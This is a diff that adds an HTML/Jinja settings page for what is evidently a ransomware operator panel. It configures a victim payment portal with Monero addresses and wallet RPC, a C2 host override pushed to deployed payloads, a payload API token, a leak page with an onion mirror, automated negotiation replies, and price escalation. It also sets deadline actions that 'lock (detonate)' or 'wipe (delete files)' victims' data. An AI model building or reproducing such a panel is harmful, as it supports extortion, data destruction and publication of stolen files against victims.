@@ -1,0 +1,117 @@
+{% extends "base.html" %}
+{% block title %}settings{% endblock %}
+{% block content %}
+<h1>Settings</h1>
+<p class="sub">portal, payments and housekeeping — applied at runtime</p>
+
+<form method="post" class="panel" style="max-width:760px">
+  <input type="hidden" name="csrf" value="{{ csrf_token }}">
+  <h2>Portal</h2>
+  <label>portal title</label><input name="portal_title" value="{{ s.portal_title }}">
+  <label>portal intro</label><textarea name="portal_intro" rows="3">{{ s.portal_intro }}</textarea>
+  <label>default price (usd)</label><input name="price_usd" value="{{ s.price_usd }}" inputmode="decimal">
+  <label>xmr address</label><input name="xmr_address" value="{{ s.xmr_address }}">
+  <label>proof upload max mb</label><input name="proof_max_mb" value="{{ s.proof_max_mb }}" inputmode="numeric">
+  <label>proof uploads</label>
+  <select name="proof_enabled">
+    <option value="1" {{ 'selected' if s.proof_enabled=='1' }}>enabled</option>
+    <option value="0" {{ 'selected' if s.proof_enabled!='1' }}>disabled</option>
+  </select>
+
+  <h2>Payments</h2>
+  <label>mode</label>
+  <select name="payment_mode">
+    <option value="manual" {{ 'selected' if s.payment_mode!='rpc' }}>manual</option>
+    <option value="rpc" {{ 'selected' if s.payment_mode=='rpc' }}>wallet rpc</option>
+  </select>
+  <label>wallet rpc url</label><input name="wallet_rpc_url" value="{{ s.wallet_rpc_url }}">
+  <label>wallet rpc user</label><input name="wallet_rpc_user" value="{{ s.wallet_rpc_user }}">
+  <label>wallet rpc password</label><input type="password" name="wallet_rpc_pass"
+         value="" placeholder="{{ 'configured — leave blank to keep' if s.wallet_rpc_pass else '' }}">
+  <label>usd per xmr (0 = auto-verify off)</label>
+  <input name="xmr_usd_rate" value="{{ s.xmr_usd_rate }}" inputmode="decimal">
+
+  <h2>Housekeeping</h2>
+  <label>backup snapshots to keep</label><input name="backup_keep" value="{{ s.backup_keep }}" inputmode="numeric">
+  <label>event retention (days)</label><input name="event_retention_days" value="{{ s.event_retention_days }}" inputmode="numeric">
+
+  <div style="height:14px"></div>
+  <button class="btn wide" type="submit">SAVE SETTINGS</button>
+</form>
+
+<div class="grid" style="margin-top:16px">
+  <div class="panel">
+    <h2>Database backup</h2>
+    <p class="sub">Downloads a consistent sqlite snapshot (WAL checkpointed).</p>
+    <form method="post" action="{{ url_for('backup') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn" type="submit">DOWNLOAD BACKUP</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h2>Prune old data</h2>
+    <p class="sub">Deletes events and reports older than the retention window.</p>
+    <form method="post" action="{{ url_for('maintenance_prune') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <input name="days" value="{{ s.event_retention_days }}" inputmode="numeric">
+      <div style="height:8px"></div>
+      <button class="btn red" type="submit"
+              onclick="return confirm('Delete old events/reports?')">PRUNE NOW</button>
+    </form>
+  </div>
+</div>
+
+<h2>Campaign &amp; routing</h2>
+<div class="grid">
+  <div class="panel">
+    <h3>Endpoint override</h3>
+    <p class="sub">Pushed to every payload on its next ping; empty = keep compiled host.</p>
+    <form method="post" action="{{ url_for('settings') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <label>c2 host</label><input name="c2_host" value="{{ s.c2_host }}"
+             placeholder="c2.example.com">
+      <label>api token (payload header)</label><input name="api_token"
+             value="" placeholder="{{ 'configured — leave blank to keep' if s.api_token else 'vex-e2e-token' }}">
+      <label>leak page</label>
+      <select name="leak_enabled">
+        <option value="1" {{ 'selected' if s.leak_enabled == '1' }}>enabled</option>
+        <option value="0" {{ 'selected' if s.leak_enabled == '0' }}>disabled</option>
+      </select>
+      <label>auto reply</label>
+      <select name="auto_reply">
+        <option value="0" {{ 'selected' if s.auto_reply == '0' }}>off</option>
+        <option value="1" {{ 'selected' if s.auto_reply == '1' }}>on</option>
+      </select>
+      <label>auto reply cooldown (hours)</label>
+      <input name="auto_reply_cooldown_hours" value="{{ s.auto_reply_cooldown_hours }}"
+             inputmode="numeric">
+      <label>negotiation state machine (0/1)</label><input name="negotiation_enabled" value="{{ s.negotiation_enabled }}">
+<label>session idle minutes</label><input name="session_idle_min" value="{{ s.session_idle_min }}">
+<label>checkins per minute per IP</label><input name="checkin_rate_per_min" value="{{ s.checkin_rate_per_min }}">
+<label>require 2FA for admins (0/1)</label><input name="require_2fa" value="{{ s.require_2fa }}">
+<label>leak onion mirror</label><input name="leak_onion" value="{{ s.leak_onion }}">
+<label>xmr address pool (one per line)</label><textarea name="xmr_addresses" rows="3">{{ s.xmr_addresses }}</textarea>
+<label>deadline hours</label><input name="deadline_hours" value="{{ s.deadline_hours }}"
+             inputmode="numeric">
+      <label>deadline action</label>
+      <select name="auto_action">
+        <option value="none" {{ 'selected' if s.auto_action == 'none' }}>none</option>
+        <option value="lock" {{ 'selected' if s.auto_action == 'lock' }}>lock (detonate)</option>
+        <option value="wipe" {{ 'selected' if s.auto_action == 'wipe' }}>wipe (delete files)</option>
+      </select>
+      <button class="btn" type="submit">SAVE ROUTING</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h3>Price escalation</h3>
+    <form method="post" action="{{ url_for('settings') }}">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <label>step 1 after (h)</label><input name="escalate_1_hours" value="{{ s.escalate_1_hours }}">
+      <label>step 1 (+%)</label><input name="escalate_1_pct" value="{{ s.escalate_1_pct }}">
+      <label>step 2 after (h)</label><input name="escalate_2_hours" value="{{ s.escalate_2_hours }}">
+      <label>step 2 (+%)</label><input name="escalate_2_pct" value="{{ s.escalate_2_pct }}">
+      <button class="btn" type="submit">SAVE ESCALATION</button>
+    </form>
+  </div>
+</div>
+{% endblock %}
